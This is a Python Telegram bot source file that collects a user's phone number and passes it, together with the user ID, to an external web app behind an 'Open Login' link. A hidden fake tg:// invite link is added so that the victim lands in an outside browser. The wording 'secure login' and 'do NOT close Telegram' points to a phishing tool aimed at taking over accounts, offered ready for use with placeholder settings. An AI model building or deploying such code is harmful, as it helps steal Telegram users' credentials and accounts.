import os
import urllib.parse
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# CHANGE THIS TO YOUR WEB APP URL
WEB_URL = "web-production-11880.up.railway.app"  # UPDATE THIS!

# Fake tg:// link to FORCE external browser
FAKE_TG = "tg://join/?invite=AAAAAE2u5L3j4k5m6n7o8p9q0r1s2t3u4v5w6x7y8z9A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0U1V2W3X4Y5Z6A7B8C9D0E1F2G3H4I5J6K7L8M9N0O1P2Q3R4S5T6U7V8W9X0Y1Z2A3B4C5D6E7F8G9H0I1J2K3L4M5N6O7P8Q9R0S1T2U3V4W5X6Y7Z8A9B0C1D2E3F4G5H6I7J8K9L0M1N2O3P4Q5R6S7T8U9V0W1X2Y3Z4A5B6C7D8E9F0G1H2I3J4K5L6M7N8O9P0Q1R2S3T4U5V6W7X8Y9Z0A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0U1V2W3X4Y5Z6A7B8C9D0E1F2G3H4I5J6K7L8M9N0O1P2Q3R4S5T6U7V8W9X0Y1Z2A3B4C5D6E7F8G9H0I1J2K3L4M5N6O7P8Q9R0S1T2U3V4W5X6Y7Z8A9B0C1D2E3F4G5H6I7J8K9L0M1N2O3P4Q5R6S7T8U9V0W1X2Y3Z4"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Step 1: Ask for phone number
    keyboard = [[KeyboardButton("Share My Phone Number", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
    
    await update.message.reply_text(
        "Please share your phone number to continue.",
        reply_markup=reply_markup
    )

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    if contact:
        phone = contact.phone_number
        user_id = update.effective_user.id

        # Step 2: Save phone (optional) or pass to web
        context.user_data['phone'] = phone

        # Step 3: Build final URL with user_id & phone
        params = urllib.parse.urlencode({
            'user_id': user_id,
            'phone': phone
        })
        final_url = f"{WEB_URL}?{params}"

        # Step 4: Send fake tg:// → forces external browser
        await update.message.reply_text(
            "Opening secure login...\n"
            "Please wait, do NOT close Telegram.",
            disable_web_page_preview=True
        )

        # This forces Chrome/Safari
        await update.message.reply_text(
            f"<a href='{FAKE_TG}'> </a><a href='{final_url}'>Open Login</a>",
            parse_mode='HTML',
            disable_web_page_preview=True
        )
    else:
        await update.message.reply_text("Please share a valid contact.")

def main():
    # Replace with your bot token
    TOKEN = "YOUR_BOT_TOKEN_HERE"  # CHANGE THIS!

    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
